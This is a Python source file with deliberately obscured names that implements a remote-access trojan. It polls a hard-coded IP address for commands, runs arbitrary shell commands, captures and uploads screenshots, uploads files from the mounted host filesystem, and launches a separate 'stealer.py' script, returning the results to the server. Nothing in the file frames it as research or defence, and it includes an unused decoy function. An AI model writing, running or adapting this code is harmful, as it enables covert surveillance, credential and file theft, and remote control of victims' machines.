import os, time, subprocess, tempfile, requests, uuid, socket, math, random, json

_s = os.environ.get("SERVER_URL", "http://31.130.130.186:5000")
_t = int(os.environ.get("POLL_INTERVAL", "2"))
_z = os.sep + "host"
_id = "/app/.d"

def _a():
    if os.path.exists(_id):
        with open(_id, "r") as f:
            return f.read().strip()
    _n = uuid.uuid4().hex[:8]
    with open(_id, "w") as f:
        f.write(_n)
    return _n

def _b():
    try:
        o = subprocess.run(["ip", "route"], capture_output=True, text=True, timeout=2)
        for l in o.stdout.splitlines():
            if l.startswith("default"):
                p = l.split()
                if "via" in p:
                    return p[p.index("via") + 1]
    except Exception:
        pass
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception:
        return "unknown"

def _c(p):
    for t in [["scrot", "-z", p]]:
        try:
            r = subprocess.run(t, capture_output=True, text=True, timeout=15)
            if r.returncode == 0 and os.path.exists(p) and os.path.getsize(p) > 0:
                return True
        except Exception:
            pass
    return False

def _e(i, t):
    try:
        requests.post(f"{_s}/api/command", json={"id": _d, "cmd_id": i, "result": t}, timeout=10)
    except Exception:
        pass

def _f():
    global _d
    _d = _a()
    print(f"[a] s={_s}, d={_d}, ip={_b()}")
    while True:
        try:
            r = requests.get(f"{_s}/api/command", params={"id": _d}, timeout=10)
            r.raise_for_status()
            data = r.json()
        except Exception as e:
            print(f"[a] poll err: {e}")
            time.sleep(_t)
            continue
        if not data or not isinstance(data, dict):
            time.sleep(_t)
            continue
        action = data.get("action")
        if not action:
            time.sleep(_t)
            continue
        cid = data.get("cmd_id") or data.get("id")
        args = data.get("args", "")
        print(f"[a] id={cid} act={action} arg={args}")
        if action == "screen":
            tmp = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
            tmp.close()
            try:
                if _c(tmp.name):
                    with open(tmp.name, "rb") as f:
                        requests.post(f"{_s}/api/screen", files={"file": f}, data={"id": _d}, timeout=30)
                else:
                    _e(cid, "ERR: scr")
            finally:
                try:
                    os.unlink(tmp.name)
                except Exception:
                    pass
        elif action == "tg":
            try:
                result = subprocess.run(
                    ["python", "/app/stealer.py"],
                    capture_output=True, text=True, timeout=300,
                    env={**os.environ, "SERVER_URL": _s, "DEVICE_ID": _d}
                )
                o = result.stdout
                if result.stderr:
                    o += "\nERR:\n" + result.stderr
                _e(cid, o)
            except subprocess.TimeoutExpired:
                _e(cid, "ERR: timeout")
            except Exception as e:
                _e(cid, f"ERR: {e}")
        elif action == "file":
            fp = args.strip() if args else ""
            if not fp:
                _e(cid, "ERR: no path")
            else:
                if not os.path.isabs(fp):
                    fp = os.path.join(_z, fp)
                else:
                    fp = os.path.join(_z, fp.lstrip("/"))
                if os.path.exists(fp) and os.path.isfile(fp):
                    with open(fp, "rb") as f:
                        requests.post(f"{_s}/api/file", files={"file": f}, data={"id": _d}, timeout=30)
                else:
                    _e(cid, f"ERR: not found {fp}")
        else:
            cmd = action
            if args:
                cmd += " " + args
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60, cwd=_z)
                o = result.stdout
                if result.stderr:
                    o += "\nERR:\n" + result.stderr
                _e(cid, o)
            except Exception as e:
                _e(cid, f"ERR: {e}")
        time.sleep(_t)

def _g(x):
    return math.sin(x) * random.random()

if __name__ == "__main__":
    _f()
